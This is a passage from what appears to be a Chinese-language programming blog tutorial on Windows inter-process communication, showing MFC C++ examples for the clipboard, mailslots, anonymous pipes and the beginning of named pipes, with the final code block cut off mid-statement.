class="built_in">GetDlgItemText</span>(IDC_EDIT_SEND,strSend);</span><br><span class="line"></span><br><span class="line"><span class="comment">//分配一个内存对象，内存对象的句柄就是hclip</span></span><br><span class="line">HANDLE hClip = <span class="built_in">GlobalAlloc</span>(GMEM_MOVEABLE, strSend.<span class="built_in">GetLength</span>()+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//剪切板上锁</span></span><br><span class="line">szSendBuf = (<span class="type">char</span>*)<span class="built_in">GlobalLock</span>(hClip);</span><br><span class="line"><span class="built_in">strcpy</span>(szSendBuf, strSend);</span><br><span class="line"></span><br><span class="line"><span class="comment">//拷贝完之后解锁</span></span><br><span class="line"><span class="built_in">GlobalUnlock</span>(hClip);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将数据放入剪切板</span></span><br><span class="line"><span class="built_in">SetClipboardData</span>(CF_TEXT, hClip);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭剪切板</span></span><br><span class="line"><span class="built_in">CloseClipboard</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CCopyBoardDlg::OnBnClickedRecvbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//打开剪切板</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">OpenClipboard</span>())&#123;</span><br><span class="line"><span class="comment">//判断剪切板是否可用</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IsClipboardFormatAvailable</span>(CF_TEXT))&#123;</span><br><span class="line"><span class="type">char</span> *szRecvBuf;</span><br><span class="line"></span><br><span class="line"><span class="comment">//向剪切板取出数据</span></span><br><span class="line">HANDLE hClip = <span class="built_in">GetClipboardData</span>(CF_TEXT);</span><br><span class="line">szRecvBuf = (<span class="type">char</span> *)<span class="built_in">GlobalLock</span>(hClip);</span><br><span class="line"><span class="built_in">SetDlgItemText</span>(IDC_EDIT_RECV, szRecvBuf);</span><br><span class="line"><span class="built_in">GlobalUnlock</span>(hClip);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//关闭剪切板</span></span><br><span class="line"><span class="built_in">CloseClipboard</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后实现部分就是这样，在左边的内容框输入，点击发送之后，再点击接收，右边的框就有内容了</p><img src="/2022/07/21/process/009.png" class=""><p>可能会有疑惑，为什么说是同步。这个程序看似就是一个进程之间的事情。<br>实际上因为我们调用了剪切板，所以当我们点击发送的时候，我们系统的剪切板就有了内容，所以我们可以直接在别的地方粘贴出来。<br>就像这样，我可以直接在项目的源文件中粘贴出来。</p><img src="/2022/07/21/process/011.png" class=""><p>当然也可以新建一个作为桥梁嘛。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CCopyBoardCliDlg::OnBnClickedButtonrecv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//打开剪切板</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">OpenClipboard</span>())&#123;</span><br><span class="line"><span class="comment">//判断是否可用</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IsClipboardFormatAvailable</span>(CF_TEXT))&#123;</span><br><span class="line"><span class="type">char</span> *szRecvBuf;</span><br><span class="line"></span><br><span class="line"><span class="comment">//取剪切板数据</span></span><br><span class="line">HANDLE hClip = <span class="built_in">GetClipboardData</span>(CF_TEXT);</span><br><span class="line">szRecvBuf = (<span class="type">char</span> *)<span class="built_in">GlobalLock</span>(hClip);</span><br><span class="line"><span class="built_in">SetDlgItemText</span>(IDC_EDITRECV, szRecvBuf);</span><br><span class="line"><span class="built_in">GlobalUnlock</span>(hClip);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//关闭剪切板</span></span><br><span class="line"><span class="built_in">CloseClipboard</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>额老样子一个直接打开一个vs打开。</p><img src="/2022/07/21/process/012.png" class=""><p>效果就是我主要的点了发送以后，新写的可以直接通过接收获取。不是视频可能会有理解上的偏差。</p><hr><h2 id="邮槽"><a href="#邮槽" class="headerlink" title="邮槽"></a>邮槽</h2><p>邮槽是比较老的通信方式了。<br>使用邮槽的进程分为服务端和客户端。邮槽由服务端创建，在创建时需要指定邮槽名，创建后服务端得到邮槽的句柄。在邮槽创建后，客户端可以通过邮槽名打开邮槽，在获得句柄后可以向邮槽写入消息。<br>邮槽通信是单项的，只有服务端才能从邮槽中读取消息，客户端只能写入消息。消息遵循先入先出的原则。客户端先写入的消息在服务端现被读取。<br>通过邮槽通信的数据可以是任意格式，但是一条消息不能大于424字节。<br>邮槽除了在本机内进行进程间通信外，在主机间也可以通信。但是在主机间进行邮槽通信。数据通过网络传播时使用的是数据报协议(UDP)，所以是一种不可靠的通信。通过网络进行邮槽通信时，客户端必须知道服务端的主机名或者域名。</p><p><code>CreateMailslot</code>额，还是老样子微软会根据多字节还是Unicode会做一个区分，前者多个a，后者多个w。<br>其原型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateMailslot</span>(</span><br><span class="line">    _In_     LPCWSTR lpName,</span><br><span class="line">    _In_     DWORD nMaxMessageSize,</span><br><span class="line">    _In_     DWORD lReadTimeout,</span><br><span class="line">    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><img src="/2022/07/21/process/013.png" class=""><img src="/2022/07/21/process/014.png" class=""><p>然后设计这么两个东西。</p><p>先从服务器开始设计接收</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyMailslotDlg::OnBnClickedRecvbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//创建邮槽</span></span><br><span class="line">LPCTSTR szSlotName = <span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\mailslot\\Mymailslot&quot;</span>);</span><br><span class="line">HANDLE hSlot = <span class="built_in">CreateMailslot</span>(</span><br><span class="line">szSlotName,</span><br><span class="line"><span class="number">0</span>,<span class="comment">//消息大小</span></span><br><span class="line">MAILSLOT_WAIT_FOREVER,<span class="comment">//阻塞时间</span></span><br><span class="line"><span class="literal">NULL</span><span class="comment">//安全属性</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hSlot == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;CreateMailslot failed with %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后要读取数据<br>这一关键点需要用到一个特别的函数<code>ReadFile</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ReadFile</span>(</span><br><span class="line">    _In_ HANDLE hFile,<span class="comment">//句柄</span></span><br><span class="line">    _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) <span class="comment">//缓冲区</span></span><br><span class="line"></span><br><span class="line">__out_data_source(FILE) LPVOID lpBuffer,</span><br><span class="line">    _In_ DWORD nNumberOfBytesToRead,<span class="comment">//将要读取的最大字节数</span></span><br><span class="line">    _Out_opt_ LPDWORD lpNumberOfBytesRead,<span class="comment">//指针，该变量接收时同步hFile读取的字节数</span></span><br><span class="line">    _Inout_opt_ LPOVERLAPPED lpOverlapped<span class="comment">//默认NULL</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>完整的这个服务端接收功能</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyMailslotDlg::OnBnClickedRecvbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//创建邮槽</span></span><br><span class="line">LPCTSTR szSlotName = <span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\mailslot\\Mymailslot&quot;</span>);</span><br><span class="line">HANDLE hSlot = <span class="built_in">CreateMailslot</span>(</span><br><span class="line">szSlotName,</span><br><span class="line"><span class="number">0</span>,<span class="comment">//消息大小</span></span><br><span class="line">MAILSLOT_WAIT_FOREVER,<span class="comment">//阻塞时间</span></span><br><span class="line"><span class="literal">NULL</span><span class="comment">//安全属性</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hSlot == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;CreateMailslot failed with %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读数据</span></span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD dwRead;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hSlot, szBuf, <span class="number">100</span>, &amp;dwRead, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">&quot;ReadFile error!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;---dwRead = %d\n&quot;</span>, dwRead);</span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hSlot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后客户端的发送功能其实也挺类似</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMymailCliDlg::OnBnClickedSendbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//创建句柄</span></span><br><span class="line">LPCTSTR szSlotName = <span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\mailslot\\Mymailslot&quot;</span>);</span><br><span class="line">HANDLE hMailSlot = <span class="built_in">CreateFile</span>(</span><br><span class="line">szSlotName,</span><br><span class="line">FILE_GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hMailSlot == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;CreateFile failed with %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写入数据</span></span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">100</span>] = <span class="string">&quot;MailSlot Comming&quot;</span>;</span><br><span class="line">DWORD dwWrite;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteFile</span>(hMailSlot, szBuf, <span class="built_in">strlen</span>(szBuf)+<span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">&quot;Write Error!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭句柄</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hMailSlot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/21/process/015.png" class=""><p>按照这个顺序大致就是这个效果。</p><blockquote><p>邮槽用的不多，之前可以说是听都没听过</p></blockquote><hr><h2 id="匿名管道"><a href="#匿名管道" class="headerlink" title="匿名管道"></a>匿名管道</h2><p>匿名管道是一个没有命名的单向管道，本质上是一个共享的内存区域。通常用来在父进程和子进程之间通信。<br>只能实现本地两个进程之间的通信，不能实现网络通信。</p><p><code>CreatePipe</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreatePipe</span>(</span><br><span class="line">    _Out_ PHANDLE hReadPipe,</span><br><span class="line">    _Out_ PHANDLE hWritePipe,</span><br><span class="line">    _In_opt_ LPSECURITY_ATTRIBUTES lpPipeAttributes,</span><br><span class="line">    _In_ DWORD nSize</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>额这里因为是要用到两个进程，就直接在邮槽上改了。</p><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hReadPipe;<span class="comment">//读句柄</span></span><br><span class="line">HANDLE hWritePipe;<span class="comment">//写句柄</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyMailslotDlg::OnBnClickedSendbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">char</span> szBuf[] = <span class="string">&quot;This Server Pipe&quot;</span>;</span><br><span class="line">DWORD dwWrite;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteFile</span>(hWritePipe, szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;写入数据失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyMailslotDlg::OnBnClickedRecvbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD dwRead;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;Begin ReadFile&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hReadPipe, szBuf, <span class="number">100</span>, &amp;dwRead, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;读取数据失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;End PipeReadFile&quot;</span>);</span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyMailslotDlg::OnBnClickedCreBtn</span><span class="params">()</span></span>&#123;</span><br><span class="line">SECURITY_ATTRIBUTES sa;</span><br><span class="line">sa.bInheritHandle = TRUE;</span><br><span class="line">sa.lpSecurityDescriptor = <span class="literal">NULL</span>;</span><br><span class="line">sa.nLength = <span class="built_in">sizeof</span>(SECURITY_ATTRIBUTES);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">CreatePipe</span>(&amp;hReadPipe, &amp;hWritePipe, &amp;sa, <span class="number">0</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;匿名管道创建失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建子进程</span></span><br><span class="line">STARTUPINFO strStartupInfo;<span class="comment">//用来指定新进程窗口如何显示</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;strStartupInfo, <span class="number">0</span>, <span class="built_in">sizeof</span>(strStartupInfo));</span><br><span class="line">strStartupInfo.cb = <span class="built_in">sizeof</span>(strStartupInfo);</span><br><span class="line">strStartupInfo.dwFlags = STARTF_USESTDHANDLES;</span><br><span class="line">strStartupInfo.hStdInput = hReadPipe;</span><br><span class="line">strStartupInfo.hStdOutput = hWritePipe;</span><br><span class="line">strStartupInfo.hStdError = <span class="built_in">GetStdHandle</span>(STD_ERROR_HANDLE);</span><br><span class="line"></span><br><span class="line">PROCESS_INFORMATION szProcessInformation;</span><br><span class="line"><span class="built_in">memset</span>(&amp;szProcessInformation, <span class="number">0</span>, <span class="built_in">sizeof</span>(szProcessInformation));</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> iRet = <span class="built_in">CreateProcess</span>(</span><br><span class="line">_T(<span class="string">&quot;MymailCli.exe&quot;</span>),</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">TRUE,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">&amp;strStartupInfo,</span><br><span class="line">&amp;szProcessInformation</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (iRet)&#123;</span><br><span class="line"><span class="comment">//创建成功的情况</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(szProcessInformation.hProcess);</span><br><span class="line"><span class="built_in">CloseHandle</span>(szProcessInformation.hThread);</span><br><span class="line">szProcessInformation.dwProcessId = <span class="number">0</span>;</span><br><span class="line">szProcessInformation.dwThreadId = <span class="number">0</span>;</span><br><span class="line">szProcessInformation.hThread = <span class="literal">NULL</span>;</span><br><span class="line">szProcessInformation.hProcess = <span class="literal">NULL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hReadPipe);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hWritePipe);</span><br><span class="line">hReadPipe = <span class="literal">NULL</span>;</span><br><span class="line">hWritePipe = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;子进程创建失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主要是给服务端拉起一个进程，然后通过拉起的客户端进行匿名管道传递<br>进程的代码大多还是抄之前写的进程部分。</p><img src="/2022/07/21/process/016.png" class=""><hr><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hReadPipe;<span class="comment">//读句柄</span></span><br><span class="line">HANDLE hWritePipe;<span class="comment">//写句柄</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMymailCliDlg::OnBnClickedSendbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line">hWritePipe = <span class="built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">100</span>] = <span class="string">&quot;This Client Pipe&quot;</span>;</span><br><span class="line">DWORD dwWrite;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteFile</span>(hWritePipe, szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;写入数据失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMymailCliDlg::OnBnClickedRecvbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line">hReadPipe = <span class="built_in">GetStdHandle</span>(STD_INPUT_HANDLE);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD dwRead;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hReadPipe, szBuf, <span class="number">100</span>, &amp;dwRead, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;读取数据失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端因为不用管邮槽先，就通过句柄传送。</p><hr><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><img src="/2022/07/21/process/017.png" class=""><p>根据按钮打开新进程。</p><p>然后相互点击发送和接收<br>服务端发送 客户端接收</p><img src="/2022/07/21/process/018.png" class=""><p>客户端发送 服务端接收</p><img src="/2022/07/21/process/019.png" class=""><p>大致就是这么一个效果。</p><p><strong>继续插一嘴：匿名管道只能实现本地两个进程之间的通信，不能实现网络通信。</strong></p><hr><h2 id="命名管道"><a href="#命名管道" class="headerlink" title="命名管道"></a>命名管道</h2><p>与Socket相似，支持网络之间不同进程的通信<br>既然也能通信，自然也能通过c&#x2F;s模式实现</p><p><code>CreateNamePipe</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateNamedPipeA</span>(</span><br><span class="line">    _In_     LPCSTR lpName,</span><br><span class="line">    _In_     DWORD dwOpenMode,</span><br><span class="line">    _In_     DWORD dwPipeMode,</span><br><span class="line">    _In_     DWORD nMaxInstances,</span><br><span class="line">    _In_     DWORD nOutBufferSize,</span><br><span class="line">    _In_     DWORD nInBufferSize,</span><br><span class="line">    _In_     DWORD nDefaultTimeOut,</span><br><span class="line">    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>插一句，项目有些时候都用多字节的，Unicode有的时候要转换太麻烦了。</p><h3 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hNamedPipe;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CmyNamePipeSerDlg::OnBnClickedProBtn</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//创建命名管道</span></span><br><span class="line">LPCTSTR szPipeName = <span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\pipe\\mypipe&quot;</span>);</span><br><span class="line">hNamedPipe = <span class="built_in">CreateNamedPipe</span>(</span><br><span class="line">szPipeName,</span><br><span class="line">PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,</span><br><span class="line">PIPE_TYPE_BYTE, <span class="number">1</span>, <span class="number">1024</span>, <span class="number">1024</span>, <span class="number">0</span>, <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hNamedPipe == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;CreateNamePipe failed with %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;创建命名管道失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//等待客户端的连接</span></span><br><span class="line">HANDLE hEvent = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, TRUE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> 